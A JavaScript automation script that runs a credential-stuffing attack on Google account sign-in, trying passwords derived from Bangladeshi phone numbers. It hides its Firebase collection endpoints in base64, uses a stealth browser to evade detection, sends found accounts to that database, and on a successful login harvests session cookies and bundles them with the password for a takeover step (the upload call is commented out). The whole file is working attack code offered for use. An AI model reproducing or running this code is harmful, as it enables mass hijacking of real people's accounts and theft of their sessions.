require('events').EventEmitter.prototype._maxListeners = 100
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const crypto = require('crypto')
const axios = require('axios')
const fs = require('fs')


const COUNTRY = 'BD'
const LENGTH = 11
const TIMEING = 3
const SAVE_SIZE = 1
const DELAY = 1500


let signIn = 'https://accounts.google.com/InteractiveLogin?continue=https://myaccount.google.com/phone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&nojavascript=1&rip=1&service=accountsettings'

let FOUND = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvZm91bmQv')
let GMAIL = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvZ21haWwv')
let TOKEN = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUvdG9rZW4v')

let SERVER = null
let SIZE = 0
let USER_AGENT = null
let mList = []
let mReject = 0
let mCaptchaList = {}
let mReqHeader = null
let identifierToken = null
let mLoopUp = false

let mTime = 0

let page = null

puppeteer.use(StealthPlugin())

fs.readFile('id.txt', { encoding: 'utf-8' }, function(err,data){
    if(!err) {
        try {
            process.argv.slice(2).forEach(function (val, index) {
                if (index == 0) {
                    SERVER = 'server-'+data+'/child-'+val
                    if (mList.length == 0) {
                        phoneNumber(false)
                    }
                }
            })
        } catch (e) {}
    }
})

try {
    mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
} catch (error) {}

fs.watchFile('captcha.json', function(curr, prev) {
    try {
        mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
    } catch (error) {}
})


function phoneNumber(update) {
    mList = []

    if (update) {
        dataCollect(true)
    } else {
        axios.get(TOKEN+SERVER+'.json').then(res => {
            try {
                let data = res.data.list
                SIZE = res.data.size

                if (SIZE >= 1000) {
                    dataCollect(false)
                } else if(data != null && SIZE != null) {
                    mList = data
                }
            } catch (error) {}
    
            if (mList == null) {
                mList = []
            }
    
            dataCollect(false)
        }).catch(err => {})
    }
}

function dataCollect(update) {
    
    if (mList.length == 0) {
        axios.get(FOUND+'server.json').then(res => {
            try {
                if (res.data.size >= 1000) {
                    let CHECK = res.data.server
                    let S_SIZE = res.data.size
                    let COLLECT = res.data.collect
                    
                    axios.get(FOUND+'number.json?orderBy="$key"&limitToFirst=1').then(res => {
                        let key = null
                        try {
                            let data = res.data
                            if(data) {
                                for (let [keys, values] of Object.entries(data)) {
                                    key = keys
                                    for (let value of Object.values(values)) {
                                        mList.push(value)
                                    }
                                }
                            }
                        } catch (error) {}
        
                        if (key && mList.length >= 1000) {
                            if (CHECK == false) {
                                setData(FOUND+'server/size.json', S_SIZE - 1000)
                            } else {
                                setData(FOUND+'server/collect.json', COLLECT + 1000)
                            }

                            SIZE = 0
                            
                            setData(TOKEN+SERVER+'.json', { size: SIZE, list: mList })
                            deleteData(FOUND+'number/'+key+'.json')

                            if (update) {
                                setTimeout( async () => {
                                    try {
                                        mLoopUp = false
                                        await page.goto(signIn)
                                        await numberType(page, '+'+mList[SIZE])
                                        await page.click('input#next')
                                    } catch (error) {}
                                }, 100)
                            } else {
                                browserStart()
                            }
                        } else {
                            setTimeout(() => {
                                dataCollect(update)
                            }, 30000)
                        }
                    }).catch(err => {
                        setTimeout(() => {
                            dataCollect(update)
                        }, 30000)
                    })
                } else {
                    setTimeout(() => {
                        dataCollect(update)
                    }, 30000)
                }
            } catch (error) {
                setTimeout(() => {
                    dataCollect(update)
                }, 30000)
            }
        }).catch(err => {
            setTimeout(() => {
                dataCollect(update)
            }, 30000)
        })
    } else {
        if (update) {
            setTimeout( async () => {
                try {
                    mLoopUp = false
                    await page.goto(signIn)
                    await numberType(page, '+'+mList[SIZE])
                    await page.click('input#next')
                } catch (error) {}
            }, 100)
        } else {
            browserStart()
        }
    }
}

async function browserStart() {

    console.log('Browser Start', SIZE, mList.length, SERVER.split('/')[1])

    try {
        let browser = await puppeteer.launch({
            // headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })
    
        page = (await browser.pages())[0]
    
        USER_AGENT = await page.evaluate(() => navigator.userAgent)
    
        if (USER_AGENT == null) {
            USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        }

        await page.setRequestInterception(true)

        page.on('request', async (req) => {

            try {
                let url = req.url()

                if (url.startsWith('https://accounts')) {
                    // console.log(url)
                }
    
                mTime = new Date().getTime()

                if (url.startsWith('https://accounts.google.com/signin/v2/challenge')) {
                    if (url.startsWith('https://accounts.google.com/signin/v2/challenge/pwd')) {
                        (await page.target().createCDPSession()).send('Page.stopLoading')
                        let tl = null
                        let cid = '1'
                        let ifkv = null
                        let index = url.indexOf('TL=')
                        if(index != -1) {
                            tl = url.substring(index+3, url.length).split('&')[0]
                            index = url.indexOf('cid=')
                            if(index != -1) {
                                cid = url.substring(index+4, url.length).split('&')[0]
                            }
                            index = url.indexOf('ifkv=')
                            if(index != -1) {
                                ifkv = url.substring(index+5, url.length).split('&')[0]
                            } else {
                                ifkv = 'AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy'
                            }
            
                            let cookie = await page.cookies()
                            
                            let gps = null
                            cookie.forEach(function (value) {
                                if (value.name == '__Host-GAPS') {
                                    gps = value.value
                                }
                            })

                            if (mReqHeader['cookie'] == null && gps != null) {
                                mReqHeader['cookie'] = '__Host-GAPS='+gps
                            }

                            mReqHeader['referer'] = url
                            mReqHeader['content-type'] = 'application/x-www-form-urlencoded;charset=UTF-8'
                            mReqHeader['google-accounts-xsrf'] = '1'
                    
                            passwordMatching(mList[SIZE], tl, parseInt(cid), ifkv, gps, 0)
                        } else {
                            nextNumber(false)
                        }
                    } else {
                        req.abort()
                        nextNumber(false)
                    }
                } else if (url.startsWith('https://accounts.google.com/signin/v1/lookup')) {
                    req.continue()
                    mReqHeader = req.headers()
                    try {
                        let split = req.postData().split('&')
                        for (let i = 0; i < split.length; i++) {
                            if(split[i].startsWith('bgresponse')) {
                                identifierToken = decodeURIComponent(split[i].split('=')[1])
                            }
                        }
                    } catch (error) {}
                } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                    req.abort()
                    let send = mCaptchaList[new Date().getTime()]
                    if (send == null) {
                        send = 1
                    } else {
                        send += 1
                    }
                    mCaptchaList[new Date().getTime()] = send
                    console.log('Captcha', Object.keys(mCaptchaList).length)

                    nextNumber(false)

                    try {
                        fs.writeFileSync('captcha.json', JSON.stringify(mCaptchaList))
                    } catch (error) {}
                } else if (url.startsWith('https://accounts.google.com/signin/rejected')) {
                    req.abort()
                    mReject++
                    console.log('Reject', mReject)
                    if (mReject >= 3) {
                        nextNumber(false)
                    } else {
                        try {
                            mLoopUp = false
                            await page.goto(signIn)
                            await numberType(page, '+'+mList[SIZE])
                            await page.click('input#next')
                        } catch (error) {
                            nextNumber(false)
                        }
                    }
                } else if(mLoopUp) {
                    req.abort()
                    nextNumber(false)
                } else {
                    req.continue()
                }
            } catch (error) {
                req.continue()
                console.log(error)
            }
        })

        page.on('response', async (res) => {
            try {
                if (res.url().startsWith('https://accounts.google.com/signin/v1/lookup')) {
                    mLoopUp = true
                }
            } catch (error) {}
        })
    
        page.on('error', err=> {})
        
        page.on('pageerror', pageerr=> {})
    
        mLoopUp = false
        await page.goto(signIn)
        await numberType(page, '+'+mList[SIZE])
        await page.click('input#next')
    } catch (error) {
       console.log(error)
    }
}

setInterval(() => {
    if (mTime > 0 && mTime+120000 < new Date().getTime()) {
        SIZE++
        saveData(true)
        setTimeout(() => {
            console.log(SERVER.split('/')[1])
            console.log('---Restart Browser---')
            process.exit(2)
        }, 1000)
    }
}, 30000)


function passwordMatching(number, tl, cid, ifkv, gps, loop) {

    let num = number.toString()
    let pass = num.substring(num.length-LENGTH, num.length)

    if(loop == 1) {
        pass = pass.substring(0, 8)
    } else if(loop == 2) {
        pass = pass.substring(pass.length-8, pass.length)
    }

    if (identifierToken == null) {
        identifierToken = getIdentifier()
    }

    setTimeout(async () => {
        axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, getPasswordData(pass, tl, cid, ifkv, identifierToken), {
            headers: mReqHeader
        }).then(res => {
            let next = true
            try {
                let body = res.data
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 3) {
                    next = false
                    console.log('Password Match: '+SERVER.split('/')[1])
                    setData(GMAIL+(body.includes('webapproval')?'menually/':'voice/')+COUNTRY+'/'+mList[SIZE]+'.json', loop)
                    nextNumber(true)
                } else if(data[0][3] == 2) {
                    next = false
                    console.log('Password Change: '+SERVER.split('/')[1])
                    setData(GMAIL+'change/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
                    nextNumber(true)
                } else if(data[0][3] == 1) {
                    next = false
                    console.log('Login Success: '+SERVER.split('/')[1])

                    setData(TOKEN+SERVER+'/size.json', SIZE)
                    let cookiesList = res.headers['set-cookie']
                    if(cookiesList) {
                        output = 1
                        let sendCookies = ''
        
                        for(let i=0; i<cookiesList.length; i++) {
                            let singelData = cookiesList[i]
                            try {
                                let start = singelData.indexOf('=')
                                let end = singelData.indexOf(';')
                                let key = singelData.substring(0, start)
                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                    let value = singelData.substring(start+1, end)
                                    sendCookies += key+'='+value+'; '
                                }
                            } catch (e) {}
                        }

                        passwordChange(number, tl, cid, gps, pass, sendCookies, 0)
                    } else {
                        nextNumber(true)
                    }
                }
            } catch (error) {}

            if (next) {
                if (LENGTH > 8) {
                    if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
                        passwordMatching(number, tl, cid, ifkv, gps, 1)
                    } else if (loop == 1 && TIMEING == 3) {
                        passwordMatching(number, tl, cid, ifkv, gps, 2)
                    } else {
                        nextNumber(true)
                    }
                } else {
                    nextNumber(true)
                }
            }
        }).catch(err => {
            console.log('err')
            if (LENGTH > 8) {
                if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
                    passwordMatching(number, tl, cid, ifkv, gps, 1)
                } else if (loop == 1 && TIMEING == 3) {
                    passwordMatching(number, tl, cid, ifkv, gps, 2)
                } else {
                    nextNumber(true)
                }
            } else {
                nextNumber(true)
            }
        })
    }, DELAY)
}


function passwordChange(number, tl, cid, gps, password, cookies, again) {
    let data = COUNTRY+'★'+number+'★'+password+'★'+tl+'★'+gps+'★'+cid+'★'+USER_AGENT+'★'+cookies

    console.log(data)

    // axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
    //     try {
    //         let body = res.data
    //         if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
    //             nextNumber(false)
    //         } else if (again == 0) {
    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
    //         } else {
    //             nextNumber(false)
    //         }
    //     } catch (error) {
    //         if (again == 0) {
    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
    //         } else {
    //             nextNumber(false)
    //         }
    //     }
    // }).catch(err => {
    //     if (again == 0) {
    //         passwordChange(number, tl, cid, gps, password, cookies, 1)
    //     } else {
    //         nextNumber(false)
    //     }
    // })
}

function nextNumber(matching) {
    SIZE++
    mLoopUp = false
    saveData(false)
    mReject = 0
    if (SIZE >= 1000) {
        phoneNumber(true)
    } else {
        setTimeout(async () => {
            try {
                if (matching) {
                    let loaded = await page.evaluate(() => {
                        let root = document.querySelector('input#Email')
                        if (root) {
                            return true
                        }
                        return false
                    })
                    if (!loaded) {
                        await page.goto(signIn)
                    }
                } else {
                    await page.goto(signIn)
                }
                await numberType(page, '+'+mList[SIZE])
                await page.click('input#next')
            } catch (error) {
                setTimeout(() => {
                    console.log('---Restart Browser---')
                    process.exit(2)
                }, 1000)
            }
        }, 100 + DELAY)
    }
}

function getPasswordData(password, tl, cid, ifkv, token) {
    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&ifkv='+ifkv+'&rip=1&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,cid,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(['identifier', token]))+'&cookiesDisabled=false&gmscoreversion=undefined&checkConnection=youtube%3A371%3A0&checkedDomains=youtube&pstMsg=1&'
}


function getIdentifier() {
    let data = '<'
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

function saveData(instant) {
    if (instant || SIZE%SAVE_SIZE == 0) {
        console.log('Save Data: '+SERVER.split('/')[1], SIZE)
        setData(TOKEN+SERVER+'/size.json', SIZE)
    }
}

function setData(url, data) {
    axios.put(url, JSON.stringify(data), {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(res => {}).catch(err => {})
}

function deleteData(url) {
    axios.delete(url).then(res => {}).catch(err => {})
}

async function numberType(page, number) {
    await delay(500)
    await page.evaluate((gmail) => document.querySelector('input#Email').value = gmail, number)
    await delay(500)
}

function decrypt(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
